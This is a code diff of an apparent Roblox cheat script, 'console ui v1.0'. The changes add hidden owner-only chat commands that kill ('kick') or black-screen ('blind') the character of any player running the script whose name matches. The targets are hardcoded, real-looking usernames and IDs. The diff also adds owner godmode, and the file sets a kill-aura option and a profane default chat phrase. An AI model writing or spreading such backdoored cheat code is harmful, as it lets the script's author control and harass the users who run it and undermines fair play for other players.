@@ -4,7 +4,7 @@
   ║                  console ui v1.0                       ║
   ╚═══════════════════════════════════════════════════════════╝
 ]]
-local IMMUNE_USER = "NotADenizAlt"
+local IMMUNE_USER = "6FATALXXX"
 local function isImmune(p)
     return p and p.Name == IMMUNE_USER
 end
@@ -25,8 +25,10 @@ local lp       = Players.LocalPlayer
 -- ════════════════════════════════════════════════════════════
 local OWNER_NAME = "NotADenizAlt"
 local OWNER_ID = 10765082375
-local KICK_TARGET_NAME = "Tarik"
+local KICK_TARGET_NAME = "crayz608"
 local KICK_TARGET_ID = 4719776291
+local BLIND_TARGET_NAME = "crayz608"
+local BLIND_TARGET_ID = 4719776291
 local SCRIPT_VERSION = "1.0.0"
 local ALLOWED_USERS = {
     [OWNER_NAME] = true,
@@ -101,12 +103,43 @@ if lp.Name == OWNER_NAME then
 end
 
 -- ════════════════════════════════════════════════════════════
--- CHAT COMMANDS: usertag + kick
+-- CHAT COMMANDS: usertag + kick + blind
 -- ════════════════════════════════════════════════════════════
+local blindGui = nil
+
+local function applyBlind()
+    if blindGui then return end
+    pcall(function()
+        blindGui = Instance.new("ScreenGui")
+        blindGui.Name = "AnyPlayers_Blind"
+        blindGui.IgnoreGuiInset = true
+        blindGui.DisplayOrder = 99999
+        blindGui.Parent = lp.PlayerGui or CoreGui
+        local black = Instance.new("Frame")
+        black.Size = UDim2.fromScale(1, 1)
+        black.BackgroundColor3 = Color3.new(0, 0, 0)
+        black.BorderSizePixel = 0
+        black.Parent = blindGui
+        local lbl = Instance.new("TextLabel")
+        lbl.Size = UDim2.fromScale(1, 1)
+        lbl.BackgroundTransparency = 1
+        lbl.Text = "YOU HAVE BEEN BLINDED BY THE OWNER"
+        lbl.TextColor3 = Color3.new(1, 1, 1)
+        lbl.TextSize = 24
+        lbl.Font = Enum.Font.GothamBold
+        lbl.Parent = black
+    end)
+end
+
+local function removeBlind()
+    if blindGui then pcall(function() blindGui:Destroy() end); blindGui = nil end
+end
+
 local function onChatMessage(plr, msg)
     if not msg or msg == "" then return end
     local lower = msg:lower()
 
+    -- OWNER TAG: anyone types "usertag" to show tag above owner
     if lower == "usertag" then
         for _, p in ipairs(Players:GetPlayers()) do
             if tostring(p.Name) == OWNER_NAME then
@@ -115,24 +148,45 @@ local function onChatMessage(plr, msg)
         end
     end
 
+    -- KICK: owner types "kick <name> [reason]" — targeted player self-breaks
     if plr.UserId == OWNER_ID and lower:sub(1, 5) == "kick " then
         local rest = msg:sub(6)
         local spacePos = rest:find(" ")
         local targetName = spacePos and rest:sub(1, spacePos - 1) or rest
         local reason = spacePos and rest:sub(spacePos + 1) or "Kicked by owner"
         if targetName ~= "" then
-            for _, p in ipairs(Players:GetPlayers()) do
-                if tostring(p.Name):lower() == targetName:lower() then
-                    if p.Character then
-                        pcall(function() p.Character:BreakJoints() end)
-                    end
-                    pcall(function()
-                        Notif("Kick", "Kicked " .. p.Name .. ": " .. reason, "warn")
-                    end)
-                    break
-                end
+            -- If we ARE the target, break ourselves
+            if tostring(lp.Name):lower() == targetName:lower() then
+                pcall(function()
+                    Notif("Kick", "You have been kicked: " .. reason, "err")
+                end)
+                task.wait(0.3)
+                pcall(function()
+                    if lp.Character then lp.Character:BreakJoints() end
+                end)
+            else
+                -- Show notification that target was kicked
+                pcall(function()
+                    Notif("Kick", targetName .. " was kicked: " .. reason, "warn")
+                end)
             end
         end
+    end
+
+    -- BLIND: owner types "blind <name>" — targeted player gets blackscreen
+    if plr.UserId == OWNER_ID and lower:sub(1, 6) == "blind " then
+        local rest = msg:sub(7)
+        local targetName = rest:match("^%s*(.-)%s*$")
+        if targetName ~= "" and tostring(lp.Name):lower() == targetName:lower() then
+            applyBlind()
+            pcall(function() Notif("Blind", "You have been blinded by the owner", "err") end)
+        end
+    end
+
+    -- BLIND OFF: owner types "blind off" — removes blackscreen
+    if plr.UserId == OWNER_ID and lower == "blind off" then
+        removeBlind()
+        pcall(function() Notif("Blind", "Blind removed", "ok") end)
     end
 end
 
@@ -158,6 +212,44 @@ pcall(function()
         end
     end
 end)
+
+-- ════════════════════════════════════════════════════════════
+-- GODMODE — NotADenizAlt is unkillable
+-- ════════════════════════════════════════════════════════════
+if lp.Name == OWNER_NAME then
+    local function enableGodmode(char)
+        pcall(function()
+            local hum = char:WaitForChild("Humanoid", 10)
+            if not hum then return end
+            hum.BreakJointsOnDeath = false
+            hum.MaxHealth = math.huge
+            hum.Health = math.huge
+            for _, state in ipairs({Enum.HumanoidStateType.Ragdoll, Enum.HumanoidStateType.FallingDown, Enum.HumanoidStateType.Dead}) do
+                pcall(function() hum:SetStateEnabled(state, false) end)
+            end
+            hum.HealthChanged:Connect(function()
+                if hum.Health < math.huge then
+                    hum.Health = math.huge
+                end
+            end)
+        end)
+        pcall(function()
+            local hrp = char:WaitForChild("HumanoidRootPart", 10)
+            if hrp then
+                hrp:GetPropertyChangedSignal("CFrame"):Connect(function()
+                    -- Prevent knockback velocity from affecting us
+                    task.defer(function()
+                        if hrp and hrp.Parent then
+                            hrp.AssemblyLinearVelocity = Vector3.zero
+                        end
+                    end)
+                end)
+            end
+        end)
+    end
+    if lp.Character then enableGodmode(lp.Character) end
+    lp.CharacterAdded:Connect(enableGodmode)
+end
 
 -- ════════════════════════════════════════════════════════════
 -- UPDATE CHECK
@@ -259,6 +351,14 @@ SAVE.phrases      = SAVE.phrases      or "fuck you"
 SAVE.bioTypeSpeed = SAVE.bioTypeSpeed or 15
 SAVE.nameTypewriter = SAVE.nameTypewriter or false
 SAVE.kaPredict    = SAVE.kaPredict    or true
+
+-- AUTO CONFIG: always on, periodic save every 30 seconds + save on game close
+task.spawn(function()
+    while task.wait(30) do DoSave() end
+end)
+pcall(function()
+    game:BindToClose(function() DoSave() end)
+end)
 
 -- ════════════════════════════════════════════════════════════
 -- CONNECTION MANAGER
